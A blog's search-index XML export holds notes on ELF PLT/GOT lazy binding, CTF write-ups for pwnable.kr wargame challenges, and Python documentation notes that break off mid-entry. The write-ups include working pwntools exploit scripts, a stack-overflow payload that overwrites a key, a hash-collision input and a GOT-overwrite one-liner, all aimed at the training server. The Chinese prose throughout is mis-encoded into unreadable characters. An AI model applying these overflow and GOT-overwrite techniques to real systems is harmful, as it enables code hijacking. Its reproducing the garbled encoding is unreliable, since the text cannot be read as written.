<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[èŠèŠpltä¸Žgot]]></title>
    <url>%2F2019%2F07%2F24%2F%E8%81%8A%E8%81%8Aplt%E4%B8%8Egot%2F</url>
    <content type="text"><![CDATA[æ·±å…¥ç†è§£pltå’Œgot å…ˆå†™ä¸€æ®µä»£ç ï¼š 123456789// Build with: gcc -m32 --no-pie -g -o plt plt.c#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(int argc, char **argv) &#123; puts("Hello world!"); exit(0);&#125; é€”ä¸­é‡åˆ°äº†ä¸€ä¸ªæŠ¥é”™ï¼š 1234In file included from /usr/include/stdio.h:27:0, from plt.c:3:/usr/include/features.h:374:25: fatal error: sys/cdefs.h: No such file or directory # include &lt;sys/cdefs.h&gt; ç„¶åŽå®‰è£…ä¸€ä¸ª: apt install libc6-dev-i386 ç¼–è¯‘å¥½ç¨‹åºä¹‹åŽ 1234567$ checksec plt [*] &apos;/home/pxy/pwnable/plt&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) ç¨‹åºæ˜¯æ²¡æœ‰pieçš„ readelf -S pltæŸ¥çœ‹èŠ‚è¡¨ 12345[Nr] Name Type Addr Off Size ES Flg Lk Inf Al[12] .plt PROGBITS 08048300 000300 000050 04 AX 0 0 16[13] .text PROGBITS 08048350 000350 000192 00 AX 0 0 16[22] .got PROGBITS 08049ffc 000ffc 000004 04 WA 0 0 4[23] .got.plt PROGBITS 0804a000 001000 00001c 04 WA 0 0 4 å¯ä»¥çœ‹åˆ°ï¼š .plt åŸºåœ°å€ä¸ºï¼š 0x08048300 .got åŸºåœ°å€ä¸ºï¼š 0x08049ffc .got.plt åŸºåœ°å€ä¸ºï¼š 0x0x804a000 æˆ‘ä»¬ä»Žè°ƒç”¨putså‡½æ•°é‚£é‡Œå¼€å§‹å•æ­¥æ‰§è¡Œ é¦–å…ˆè·³è½¬åˆ°pltè¡¨ä¸­ 120x804845d &lt;main+16&gt; call puts@plt &lt;0x8048310&gt;0x8048310 &lt;puts@plt&gt; jmp dword ptr [puts@got.plt] &lt;0x804a00c&gt; call putsä¹‹åŽï¼Œä¸‹ä¸€æ¡æŒ‡ä»¤ä¹Ÿæ˜¯ä¸€ä¸ªè·³è½¬ jmp dword ptr [puts@got.plt] &lt;0x804a00c&gt; è¿™æ¡æŒ‡ä»¤çš„æ„æ€æ˜¯å–å‡ºputs@got.pltè¡¨ä¸­çš„å€¼ï¼Œæ”¾åˆ°pcå¯„å­˜å™¨ä¸­ æ‰€ä»¥ï¼ŸæŸ¥çœ‹ä¸€ä¸‹æ­¤å¤„å†…å­˜çš„å€¼ï¼š 12pwndbg&gt; x/2x 0x804a00c0x804a00c &lt;puts@got.plt&gt;: 0x08048316 0x08048326 æ‰€ä»¥ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€å°±æ˜¯0x08048316è¿˜æ˜¯åœ¨pltè¡¨ä¸­ 12â–º 0x8048316 &lt;puts@plt+6&gt; push 0 0x804831b &lt;puts@plt+11&gt; jmp 0x8048300 è¿™é‡Œå…ˆå°†0æ”¾åˆ°æ ˆä¸Šï¼Œè¡¨æ˜Žæ˜¯è¦è§£æžputså‡½æ•°çš„åœ°å€ï¼Œç„¶åŽå†è·³è½¬åˆ°0x8048300ä¹Ÿå°±æ˜¯pltè¡¨çš„å¼€å§‹éƒ¨åˆ† 12â–º 0x8048300 push dword ptr [_GLOBAL_OFFSET_TABLE_+4] &lt;0x804a004&gt; 0x8048306 jmp dword ptr [0x804a008] &lt;0xf7ff0650&gt; è¿™æ—¶å€™å…ˆæŠŠ.got.pltè¡¨ä¸­çš„ç¬¬äºŒé¡¹æ”¾åˆ°æ ˆä¸Š å…ˆæŸ¥çœ‹ä¸€ä¸‹.got.pltä¸­å‰ä¸‰é¡¹çš„å†…å®¹: 12pwndbg&gt; x/3x 0x804a0000x804a000: 0x08049f14 0xf7ffd938 0xf7ff0650 å°†0xf7ffd938æ”¾ç½®åˆ°æ ˆä¸Šï¼Œç„¶åŽè·³è½¬åˆ°.got.pltä¸­çš„ç¬¬ä¸‰é¡¹ï¼Œä¹Ÿå°±æ˜¯ 0xf7ff0650ï¼Œè¿™ä¸ªåœ°å€å°±æ˜¯_dl_runtime_resolveå‡½æ•°çš„åœ°å€ è´Ÿè´£è§£æžå‡½æ•°çš„åœ°å€ æ­¤æ—¶æˆ‘ä»¬çš„gotè¡¨å†…å®¹å¦‚ä¸‹ï¼š 12345678pwndbg&gt; gotGOT protection: Partial RELRO | GOT functions: 4[0x804a00c] puts -&gt; 0x8048316 (puts@plt+6) â—‚â€” push 0 /* &apos;h&apos; */[0x804a010] __gmon_start__ -&gt; 0x8048326 (__gmon_start__@plt+6) â—‚â€” push 8[0x804a014] exit -&gt; 0x8048336 (exit@plt+6) â—‚â€” push 0x10[0x804a018] __libc_start_main -&gt; 0xf7e26a00 (__libc_start_main) â—‚â€” push ebp putså‡½æ•°çš„åœ°å€è¿˜æ²¡æœ‰é‡å®šä½ å½“æˆ‘ä»¬æ‰§è¡Œè¿‡ä¸€éputså‡½æ•°ä¹‹åŽ è¿™æ—¶å€™å›žè¿‡å¤´æ¥ç»§ç»­æŸ¥çœ‹gotè¡¨ä¸­çš„å†…å®¹ï¼š 12345678pwndbg&gt; gotGOT protection: Partial RELRO | GOT functions: 4[0x804a00c] puts -&gt; 0xf7e727e0 (puts) â—‚â€” push ebp[0x804a010] __gmon_start__ -&gt; 0x8048326 (__gmon_start__@plt+6) â—‚â€” push 8[0x804a014] exit -&gt; 0x8048336 (exit@plt+6) â—‚â€” push 0x10[0x804a018] __libc_start_main -&gt; 0xf7e26a00 (__libc_start_main) â—‚â€” push ebp å¯ä»¥çœ‹åˆ°åœ°å€å·²ç»é‡å®šä½å¥½äº† è¿™å’ŒWindowsçš„PEæ–‡ä»¶æ ¼å¼ä¼¼ä¹Žæœ‰ç‚¹ä¸åŒäº†ï¼ŒPEæ–‡ä»¶æ˜¯è£…è½½è¿›å†…å­˜ä¹‹åŽå‡½æ•°åœ°å€éƒ½å·²ç»é‡å®šä½å¥½äº†ï¼Œè€ŒLinuxçš„elfæ–‡ä»¶åˆšåˆšè£…è¿›å†…å­˜ä¹‹åŽå‡½æ•°çš„åœ°å€è¿˜æ˜¯ä¸ç¡®å®šçš„ï¼Œéœ€è¦åœ¨è¿è¡Œçš„æ—¶å€™è¿›è¡Œé‡å®šä½ã€‚ å½“æˆ‘ä»¬å°†ä»£ç ä¿®æ”¹ä¸ºå¦‚ä¸‹æ—¶ï¼š 1234567891011pwndbg&gt; l 1, 20// Build with: gcc -m32 -no-pie -g -o plt plt.c#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(int argc, char **argv) &#123; puts("Hello world!"); puts("hello world again !!!"); exit(0);&#125; ç¬¬ä¸€æ¬¡è°ƒç”¨putså‡½æ•°ä¹‹åŽï¼š [0x804a00c] puts -&gt; 0xf7e727e0 (puts) â—‚â€” push ebp putså‡½æ•°åœ°å€å·²ç»é‡å®šä½å¥½äº† æŽ¥ä¸‹æ¥å†æ¬¡è°ƒç”¨putså‡½æ•° 123456â–º 0x8048310 &lt;puts@plt&gt; jmp dword ptr [0x804a00c] &lt;0xf7e727e0&gt; â†“ 0xf7e727e0 &lt;puts&gt; push ebp 0xf7e727e1 &lt;puts+1&gt; push edi 0xf7e727e2 &lt;puts+2&gt; push esi 0xf7e727e3 &lt;puts+3&gt; push ebx æ­¤æ—¶å¯ä»¥çœ‹åˆ°ç›´æŽ¥å°±è·³åˆ°å‡½æ•°çš„åœ°å€äº† å› ä¸ºæ­¤æ—¶çš„.got.pltå·²ç»æ˜¯putså‡½æ•°çš„åœ°å€äº†ï¼Œ Linux tql æ•´ç†ä¸€ä¸‹ ä¹‹å‰çœ‹å‚è€ƒèµ„æ–™ä¸­åšä¸»çš„æ–‡ç« ä¸€ç›´æ²¡æœ‰å¾ˆç†è§£ï¼Œè¿™é‡Œç›´æŽ¥ç»Ÿä¸€è¯´ä¸€ä¸‹æˆ‘çš„ç†è§£ï¼š ä½•è°“PLTä¸ŽGOT å…¶å®žè¿™é‡Œå‡†ç¡®çš„æ¥è¯´åº”è¯¥å«got.pltè€Œä¸æ˜¯å«gotï¼Œä¸è¿‡ä¸ºäº†æ–¹ä¾¿æˆ‘ä»¬è¿˜æ˜¯å«å®ƒgotè¡¨å§ è¦æ³¨æ„é‚£ä¸ªjmp *printf@got *å·æ˜¯å–å‡ºåœ°å€å¤„çš„å€¼ï¼Œå¹¶ä¸æ˜¯è·³åˆ°gotè¡¨ä¸­åŽ» å»¶è¿Ÿé‡å®šä½ è¿™ç¯‡æ–‡ç« æˆ‘è§‰å¾—å†™çš„å¾ˆç²¾å½© Linuxä¸ºäº†ç¼©å‡ä»£ç ,å°±æ˜¯æŒ‰ç…§è¿™ç§æ¨¡å¼æ¥çš„ï¼š 12345678910void printf@plt()&#123;address_good: jmp *printf@got // é“¾æŽ¥å™¨å°†printf@gotå¡«æˆä¸‹ä¸€è¯­å¥lookup_printfçš„åœ°å€lookup_printf: è°ƒç”¨é‡å®šä½å‡½æ•°æŸ¥æ‰¾printfåœ°å€ï¼Œå¹¶å†™åˆ°printf@got goto address_good;&#125; ä¹Ÿå°±å’Œä¸Šé¢é‚£å¼ å›¾æ˜¯ä¸€ä¸€å¯¹åº”çš„ å…¬å…±gotè¡¨é¡¹ åœ¨è§£æžå‡½æ•°çš„çœŸæ­£åœ°å€æ—¶ï¼Œ _dl_runtime_resolveæ˜¯æ€Žä¹ˆçŸ¥é“å®ƒè¦è§£æžå“ªä¸ªå‡½æ•°çš„ å› ä¸ºï¼š 1234printf@plt&gt;: jmp *0x80496f8 push $0x00 jmp common@plt è¿™é‡Œpushçš„å€¼ä¸ä¸€æ ·ï¼Œç›¸å½“äºŽå°±æ˜¯æ¯ä¸ªå‡½æ•°å–äº†ä¸€ä¸ªid ä¹‹åŽå°±æ˜¯å…¬å…±gotè¡¨çš„å†…å®¹ï¼š got[0]: æœ¬ELFåŠ¨æ€æ®µ(.dynamicæ®µï¼‰çš„è£…è½½åœ°å€ got[1]ï¼šæœ¬ELFçš„link_mapæ•°æ®ç»“æž„æè¿°ç¬¦åœ°å€ got[2]ï¼š_dl_runtime_resolveå‡½æ•°çš„åœ°å€ ç©¿é’ˆå¼•çº¿ PLTè¡¨ä¸­çš„ç¬¬ä¸€é¡¹ä¸ºå…¬å…±è¡¨é¡¹ï¼Œå‰©ä¸‹çš„æ˜¯æ¯ä¸ªåŠ¨æ€åº“å‡½æ•°ä¸ºä¸€é¡¹ï¼ˆå½“ç„¶æ¯é¡¹æ˜¯ç”±å¤šæ¡æŒ‡ä»¤ç»„æˆçš„ï¼Œjmp *0xXXXXXXXXè¿™æ¡æŒ‡ä»¤æ˜¯æ‰€æœ‰pltçš„å¼€å§‹æŒ‡ä»¤ï¼‰æ¯é¡¹PLTéƒ½ä»Žå¯¹åº”çš„GOTè¡¨é¡¹ä¸­è¯»å–ç›®æ ‡å‡½æ•°åœ°å€ GOTè¡¨ä¸­å‰3ä¸ªä¸ºç‰¹æ®Šé¡¹ï¼Œåˆ†åˆ«ç”¨äºŽä¿å­˜ .dynamicæ®µåœ°å€ã€æœ¬é•œåƒçš„link_mapæ•°æ®ç»“æž„åœ°å€å’Œ_dl_runtime_resolveå‡½æ•°åœ°å€ï¼›ä½†åœ¨ç¼–è¯‘æ—¶ï¼Œæ— æ³•èŽ·å–çŸ¥é“link_mapåœ°å€å’Œ_dl_runtime_resolveå‡½æ•°åœ°å€ï¼Œæ‰€ä»¥ç¼–è¯‘æ—¶å¡«é›¶åœ°å€ï¼Œè¿›ç¨‹å¯åŠ¨æ—¶ç”±åŠ¨æ€é“¾æŽ¥å™¨è¿›è¡Œå¡«å…… å‚è€ƒ èŠèŠLinuxåŠ¨æ€é“¾æŽ¥ä¸­çš„PLTå’ŒGOTï¼ˆï¼‘ï¼‰â€”â€”ä½•è°“PLTä¸ŽGOT èŠèŠLinuxåŠ¨æ€é“¾æŽ¥ä¸­çš„PLTå’ŒGOTï¼ˆï¼’ï¼‰â€”â€”å»¶è¿Ÿé‡å®šä½ èŠèŠLinuxåŠ¨æ€é“¾æŽ¥ä¸­çš„PLTå’ŒGOTï¼ˆï¼“ï¼‰â€”â€”å…¬å…±GOTè¡¨é¡¹ èŠèŠLinuxåŠ¨æ€é“¾æŽ¥ä¸­çš„PLTå’ŒGOTï¼ˆ4ï¼‰â€”â€” ç©¿é’ˆå¼•çº¿ GOT and PLT for pwning.]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwnable]]></title>
    <url>%2F2019%2F07%2F24%2Fpwnable%2F</url>
    <content type="text"><![CDATA[pwnableä»Žå°ç™½å¼€å§‹ pwnableæ˜¯ä¸€ä¸ªé€‚åˆå°ç™½çš„ç½‘ç«™ https://pwnable.kr/play.php fd æœ‰æºç ï¼š 123456789101112131415161718192021#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;char buf[32];int main(int argc, char* argv[], char* envp[])&#123; if(argc&lt;2)&#123; printf("pass argv[1] a number\n"); return 0; &#125; int fd = atoi( argv[1] ) - 0x1234; int len = 0; len = read(fd, buf, 32); if(!strcmp("LETMEWIN\n", buf))&#123; printf("good job :)\n"); system("/bin/cat flag"); exit(0); &#125; printf("learn about Linux file IO\n"); return 0;&#125; è¿™é“é¢˜ç›®æ˜¯è®©ä½ äº†è§£Linuxä¸‹çš„æ–‡ä»¶æè¿°ç¬¦ 12345fd@prowl:~$ ./fd 4660LETMEWINgood job :)mommy! I think I know what a file descriptor is!!fd@prowl:~$ collision 12345678910111213141516171819202122232425262728293031#include &lt;stdio.h&gt;#include &lt;string.h&gt;unsigned long hashcode = 0x21DD09EC;unsigned long check_password(const char* p)&#123; int* ip = (int*)p; int i; int res=0; for(i=0; i&lt;5; i++)&#123; res += ip[i]; &#125; return res;&#125;int main(int argc, char* argv[])&#123; if(argc&lt;2)&#123; printf("usage : %s [passcode]\n", argv[0]); return 0; &#125; if(strlen(argv[1]) != 20)&#123; printf("passcode length should be 20 bytes\n"); return 0; &#125; if(hashcode == check_password( argv[1] ))&#123; system("/bin/cat flag"); return 0; &#125; else printf("wrong passcode.\n"); return 0;&#125; æžœç„¶æˆ‘è¿˜æ˜¯å°ç™½ï¼Œè¿žæœ€åŸºæœ¬çš„å¸¸è¯†éƒ½ä¸æ‡‚äº†ï¼Œæ„è¯†åˆ°äº†æ˜¯ç”±è¾“å…¥çš„argv[1]æ¥è®¡ç®—çš„ï¼Œ20ä¸ªå­—èŠ‚æ­£å¥½åˆ†æˆ5æ¬¡ï¼Œå°±æ˜¯æŠŠæ¯å››ä¸ªåŠ èµ·æ¥å°±è¡Œäº†ã€‚ æ‰€ä»¥å¯ä»¥ç›´æŽ¥æ‹¿0x21DD09ECåŽ»é™¤æŽ‰5å°±å¥½äº† expå¦‚ä¸‹ï¼š 1234567from pwn import *pwn_ssh=ssh(host='pwnable.kr',user='col',password='guest',port=2222)print(pwn_ssh.connected())sh=pwn_ssh.process(argv=['collision','\xc9\xce\xc5\x06'*4+'\xc8\xce\xc5\x06'],executable='./col')print(sh.recvall()) è¿™é‡Œè¿˜å­¦åˆ°äº†ä¸€æ³¢ç”¨pwnsshè¿žæŽ¥çš„ã€‚ bof æºç ï¼š 123456789101112131415161718#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;void func(int key)&#123; char overflowme[32]; printf("overflow me : "); gets(overflowme); // smash me! if(key == 0xcafebabe)&#123; system("/bin/sh"); &#125; else&#123; printf("Nah..\n"); &#125;&#125;int main(int argc, char* argv[])&#123; func(0xdeadbeef); return 0;&#125; è¿™æ˜¯ä¸€ä¸ªç®€å•çš„æ ˆæº¢å‡ºçš„é¢˜ç›® è™½ç„¶ç®€å•ï¼Œä½†æ˜¯å°ç™½è¿˜æ˜¯è¦ä»”ç»†åœ°åˆ†æžä¸€ä¸‹çš„ã€‚ funcå¯¹åº”çš„æ±‡ç¼–ä»£ç ï¼Œå…¶å®žæ„Ÿè§‰æ±‡ç¼–ä»£ç çœ‹çš„æ›´æ˜Žç™½ä¸€äº›ï¼š 12345678910111213141516171819202122.text:565D262C func proc near ; CODE XREF: main+10p.text:565D262C.text:565D262C s = byte ptr -2Ch.text:565D262C var_C = dword ptr -0Ch.text:565D262C arg_0 = dword ptr 8.text:565D262C.text:565D262C push ebp.text:565D262D mov ebp, esp.text:565D262F sub esp, 48h.text:565D2632 mov eax, large gs:14h ;gsä¿æŠ¤æœºåˆ¶.text:565D2638 mov [ebp+var_C], eax.text:565D263B xor eax, eax.text:565D263D mov dword ptr [esp], offset s ; &quot;overflow me : &quot;.text:565D2644 call near ptr puts+565D2649h.text:565D2649 lea eax, [ebp+s].text:565D264C mov [esp], eax ; s.text:565D264F call near ptr gets+565D2654h.text:565D2654 cmp [ebp+arg_0], 0CAFEBABEh.text:565D265B jnz short loc_565D266B.text:565D265D mov dword ptr [esp], offset command ; &quot;/bin/sh&quot;.text:565D2664 call near ptr system+565D2669h.text:565D2669 jmp short loc_565D2677 ä¹‹å‰ä¸€ç›´ä¸å¤ªæ˜Žç™½å¦‚æžœå±€éƒ¨å˜é‡æ˜¯æ•°ç»„è¯¥æ€Žä¹ˆæž å…³é”®æ˜¯è¿™é‡Œï¼š 12.text:565D2649 lea eax, [ebp+s].text:565D264C mov [esp], eax ; s æ³¨æ„ lea eax, [ebp+s] è¿™é‡ŒåŠ äº†æ–¹æ‹¬å·ä½†æ˜¯å…¶å®žè¿˜æ˜¯åœ°å€ï¼Œå°±æ˜¯å°†å­—ç¬¦ä¸²sçš„åœ°å€èµ‹å€¼ç»™eax ç„¶åŽå†å°†å…¶å­˜æ”¾åˆ°æ ˆé¡¶ï¼Œä¹‹åŽè°ƒç”¨getså‡½æ•°ï¼Œå°†è¾“å…¥çš„å€¼å¡«å…¥åˆ°ç¼“å†²åŒº ä»Žè¿™å¼ å›¾å°±èƒ½æ˜Žç™½å†…å­˜çš„åˆ†å¸ƒäº† è¿™é“é¢˜ç›®ä¿æŠ¤æœºåˆ¶åŸºæœ¬éƒ½å¼€äº†ï¼Œä½†æ˜¯æˆ‘ä»¬å¹¶ä¸éœ€è¦æ‰§è¡Œä»£ç ã€‚åªéœ€è¦è¦†ç›–æ ˆä¸Šçš„å€¼å°±è¡Œäº†ã€‚ä¹Ÿä¸ä¼šè§¦å‘gsä¿æŠ¤æœºåˆ¶ expå¦‚ä¸‹ï¼š 12345678from pwn import *payload = 'A'*52+'\xbe\xba\xfe\xca'r=remote('pwnable.kr',9000)print(r.connected())r.sendline(payload)r.interactive() è¿è¡Œæ•ˆæžœå¦‚ä¸‹ï¼š 12345678910111213pxy@ubuntu:~/pwnable$ python bofexp.py[+] Opening connection to pwnable.kr on port 9000: DoneTrue[*] Switching to interactive mode$ lsbofbof.cflagloglog2super.pl$ cat flagdaddy, I just pwned a buFFer :) flag è¿™é“é¢˜ç›®è¢«upxåŠ å£³ï¼ŒLinuxä¸‹çš„åŠ å£³å€’è¿˜æ˜¯ç¬¬ä¸€æ¬¡é‡åˆ°ã€‚ åˆ°è¿™é‡Œå¯ä»¥æ‰¾åˆ°è„±å£³çš„å·¥å…· è„±å£³ä¹‹åŽgdbè½½å…¥ï¼ŒæŸ¥çœ‹åæ±‡ç¼–ä»£ç  1234567891011121314151617181920pwndbg&gt; disassemble mainDump of assembler code for function main: 0x0000000000401164 &lt;+0&gt;: push rbp 0x0000000000401165 &lt;+1&gt;: mov rbp,rsp 0x0000000000401168 &lt;+4&gt;: sub rsp,0x10 0x000000000040116c &lt;+8&gt;: mov edi,0x496658 0x0000000000401171 &lt;+13&gt;: call 0x402080 &lt;puts&gt; 0x0000000000401176 &lt;+18&gt;: mov edi,0x64 0x000000000040117b &lt;+23&gt;: call 0x4099d0 &lt;malloc&gt; 0x0000000000401180 &lt;+28&gt;: mov QWORD PTR [rbp-0x8],rax 0x0000000000401184 &lt;+32&gt;: mov rdx,QWORD PTR [rip+0x2c0ee5] # 0x6c2070 &lt;flag&gt; 0x000000000040118b &lt;+39&gt;: mov rax,QWORD PTR [rbp-0x8] 0x000000000040118f &lt;+43&gt;: mov rsi,rdx 0x0000000000401192 &lt;+46&gt;: mov rdi,rax 0x0000000000401195 &lt;+49&gt;: call 0x400320 0x000000000040119a &lt;+54&gt;: mov eax,0x0 0x000000000040119f &lt;+59&gt;: leave 0x00000000004011a0 &lt;+60&gt;: ret End of assembler dump.pwndbg&gt; b *0x0000000000401184 ç„¶åŽåœ¨æ­¤å¤„ä¸‹æ–­ç‚¹ 123456789RAX 0x6c96b0 â—‚â€” 0x0RBX 0x401ae0 (__libc_csu_fini) â—‚â€” push rbxRCX 0x8RDX 0x496628 â—‚â€” push rbp /* &apos;UPX...? sounds like a delivery service :)&apos; */RDI 0x4RSI 0x0R8 0x1R9 0x3R10 0x22 å‘½ä¸­æ–­ç‚¹ä¹‹åŽå•æ­¥ä¸€æ¬¡å°±è¡Œ è¿™æ—¶å€™å°±çœ‹åˆ°å¯„å­˜å™¨çš„å˜åŒ– flagå°±æ˜¯é‚£ä¸ªæ‹‰2333 paascode å­¦åˆ°äº†ä¸€ç‚¹ä»Žè¿œç¨‹æœåŠ¡å™¨ä¸‹è½½ä¸œè¥¿çš„å‘½ä»¤ $ scp -P 2222 passcode@pwnable.kr:/home/passcode/passcode . æºç ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344$ cat passcode.c #include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void login()&#123; int passcode1; int passcode2; printf("enter passcode1 : "); scanf("%d", passcode1); fflush(stdin); // ha! mommy told me that 32bit is vulnerable to bruteforcing :) printf("enter passcode2 : "); scanf("%d", passcode2); printf("checking...\n"); if(passcode1==338150 &amp;&amp; passcode2==13371337)&#123; printf("Login OK!\n"); system("/bin/cat flag"); &#125; else&#123; printf("Login Failed!\n"); exit(0); &#125;&#125;void welcome()&#123; char name[100]; printf("enter you name : "); scanf("%100s", name); printf("Welcome %s!\n", name);&#125;int main()&#123; printf("Toddler's Secure Login System 1.0 beta.\n"); welcome(); login(); // something after login... printf("Now I can safely trust you that you have credential :)\n"); return 0;&#125; ä½œä¸ºä¸€åå°ç™½è¿˜æ˜¯è¦å¥½å¥½åœ°åˆ†æžæ ˆå¸§çš„æž„é€  é‚£è¦æ€Žä¹ˆåˆ†æžç¨‹åºå‘¢ï¼Ÿæœ€å…³é”®çš„è¿˜æ˜¯åˆ†æžç¨‹åºçš„äº¤äº’è¿‡ç¨‹ï¼Œæ¯•ç«Ÿæˆ‘ä»¬ä¹Ÿæ˜¯ä»Žç¨‹åºçš„è¾“å…¥å…¥æ‰‹çš„ã€‚ 12345 0x804862a &lt;welcome+33&gt; mov eax, 0x80487dd 0x804862f &lt;welcome+38&gt; lea edx, [ebp - 0x70]â–º 0x8048632 &lt;welcome+41&gt; mov dword ptr [esp + 4], edx 0x8048636 &lt;welcome+45&gt; mov dword ptr [esp], eax 0x8048639 &lt;welcome+48&gt; call __isoc99_scanf@plt &lt;0x80484a0&gt; æ­¤å¤„æ˜¯è°ƒç”¨scanfå‡½æ•°çš„è¿‡ç¨‹ï¼Œ å…ˆå°†ä¸€ä¸ªåœ°å€0x80487ddèµ‹å€¼ç»™eaxå¯„å­˜å™¨ï¼Œä¹‹åŽå°†ebp-0x70çš„åœ°å€ä¼ ç»™edxå¯„å­˜å™¨ï¼Œæ³¨æ„åˆ°è¿™é‡Œçš„æ“ä½œç¬¦æ˜¯lea ä¹‹åŽå†å°†edxå¯„å­˜å™¨çš„å€¼æ”¾åˆ°æ ˆçš„ç¬¬äºŒå±‚ï¼Œæœ€åŽå°†eaxå¯„å­˜å™¨çš„å€¼æ”¾åˆ°æ ˆé¡¶ã€‚ æ‰€ä»¥è°ƒç”¨scanfå‡½æ•°çš„æ—¶å€™ï¼Œæ ˆé¡¶æ˜¯0x80487ddï¼Œå¾€ä¸‹åŠ 4ä¸ªå­—èŠ‚å­˜å‚¨çš„æ˜¯ä¸€ä¸ªå±€éƒ¨å˜é‡å¼€å§‹çš„ä½ç½®(å°±æ˜¯å­—ç¬¦ä¸²sçš„é¦–åœ°å€) 123456 0x804862f &lt;welcome+38&gt; lea edx, [ebp - 0x70] 0x8048632 &lt;welcome+41&gt; mov dword ptr [esp + 4], edx 0x8048636 &lt;welcome+45&gt; mov dword ptr [esp], eaxâ–º 0x8048639 &lt;welcome+48&gt; call __isoc99_scanf@plt &lt;0x80484a0&gt; format: 0x80487dd â—‚â€” &apos;%100s&apos; vararg: 0xff8e7068 â—‚â€” 0x28 /* &apos;(&apos; */ è¿™æ˜¯å‚æ•°çš„ä¼ é€’è¿‡ç¨‹ æ­¤æ—¶æ ˆä¸Šçš„å¸ƒå±€ï¼š 1200:0000â”‚ esp 0xff8e7050 â€”â–¸ 0x80487dd â—‚â€” and eax, 0x73303031 /* &apos;%100s&apos; */01:0004â”‚ 0xff8e7054 â€”â–¸ 0xff8e7068 â—‚â€” 0x28 /* &apos;(&apos; */ è¿™é‡Œæœ‰ä¸€ç‚¹ç–‘æƒ‘ ç›´æŽ¥æŸ¥çœ‹å†…å­˜ 12pwndbg&gt; x/20x 0x80487dd0x80487dd: 0x30303125 0x30303125 å…¶å®žå°±æ˜¯%100çš„å°ç«¯è¡¨ç¤ºï¼ï¼ ä½†æ˜¯æ¢ä¸€ç§æ–¹å¼çœ‹ 123pwndbg&gt; x/20i 0x80487dd 0x80487dd: and eax,0x73303031 0x80487e2: add BYTE PTR [edi+0x65],dl åˆ°åº•æ˜¯æ•°æ®è¿˜æ˜¯æŒ‡ä»¤å…¨çœ‹ç¨‹åºå‘˜äº† 123456passcode@prowl:~$ python -c &quot;print &apos;A&apos;*96+&apos;\x04\xa0\x04\x08&apos;+str(0x080485d7)&quot; | ./passcodeToddler&apos;s Secure Login System 1.0 beta.enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAï¿½!enter passcode1 : Login OK!Sorry mom.. I got confused about scanf usage :(Now I can safely trust you that you have credential :) ä¸è¿‡è¿™é“é¢˜ç›®æˆ‘æ²¡æœ‰æžå¾—å¾ˆæ¸…æ¥š]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>wp</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pythonæ–‡æ¡£é˜…è¯»ç¬”è®°1]]></title>
    <url>%2F2019%2F07%2F24%2Fpython%E6%96%87%E6%A1%A3%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B01%2F</url>
    <content type="text"><![CDATA[python å®˜æ–¹æ–‡æ¡£é˜…è¯» pythonå¯è§†åŒ–ç¼–ç¨‹ç½‘ç«™ å¾ªçŽ¯ å¾ªçŽ¯çš„é—®é¢˜ listç±»åž‹æ˜¯å¯å˜åºåˆ— 12345words = ['cat', 'window', 'defenestrate']for w in words[:]: if len(w) &gt; 6: words.insert(0, w)print(words) å¦‚æžœå°†ä¸Šè¿°ä»£ç çš„å¾ªçŽ¯è¯­å¥æ”¹ä¸ºï¼š for w in words: é‚£ä¹ˆè¿™ä¸ªå¾ªçŽ¯å°±å˜æˆäº†æ­»å¾ªçŽ¯ åŽŸå› æ˜¯wordsè¿™ä¸ªlistä¼šè¢«ä¿®æ”¹ åŒæ ·çš„å¯ä»¥çœ‹è¿™ä¸ªï¼š 12345basket = ['apple', 'orange', 'pear', 'orange', 'banana']for f in sorted(basket): print(f)print(basket) åœ¨ç»è¿‡sortedå‡½æ•°ä¹‹åŽï¼Œbasketå·²ç»è¢«ä¿®æ”¹äº† å¯ä»¥çœ‹è¿™ä¸ªï¼š &lt;iframe width=&quot;800&quot; height=&quot;500&quot; frameborder=&quot;0&quot; src=&quot;http://pythontutor.com/iframe-embed.html#code=basket%20%3D%20%5B'apple',%20'orange',%20'pear',%20'orange',%20'banana'%5D%0Afor%20f%20in%20sorted%28basket%29%3A%0A%20%20%20%20print%28f%29%0A&amp;codeDivHeight=400&amp;codeDivWidth=350&amp;cumulative=false&amp;curInstr=5&amp;heapPrimitives=nevernest&amp;origin=opt-frontend.js&amp;py=3&amp;rawInputLstJSON=%5B%5D&amp;textReferences=false&quot;&gt; &lt;/iframe&gt; åŒæ ·çš„listè¿˜æœ‰è¿™æ ·ä¸€ä¸ªé—®é¢˜ï¼š ä»£ç å¦‚ä¸‹ï¼š 1234567def f(a, L=[]): L.append(a) return Lprint(f(1))print(f(2))print(f(3)) &lt;iframe width=&quot;800&quot; height=&quot;500&quot; frameborder=&quot;0&quot; src=&quot;http://pythontutor.com/iframe-embed.html#code=def%20f%28a,%20L%3D%5B%5D%29%3A%0A%20%20%20%20L.append%28a%29%0A%20%20%20%20return%20L%0A%0Aprint%28f%281%29%29%0Aprint%28f%282%29%29%0Aprint%28f%283%29%29&amp;codeDivHeight=400&amp;codeDivWidth=350&amp;cumulative=false&amp;curInstr=15&amp;heapPrimitives=nevernest&amp;origin=opt-frontend.js&amp;py=3&amp;rawInputLstJSON=%5B%5D&amp;textReferences=false&quot;&gt; &lt;/iframe&gt; ä¿®æ”¹æˆè¿™æ ·å°±è¡Œï¼š 12345def f(a, L = None): if L is None: L = [] L.append(a) return L å¾ªçŽ¯çš„tricks dictå¾ªçŽ¯ 123knights = &#123;'gallahad':'the pure', 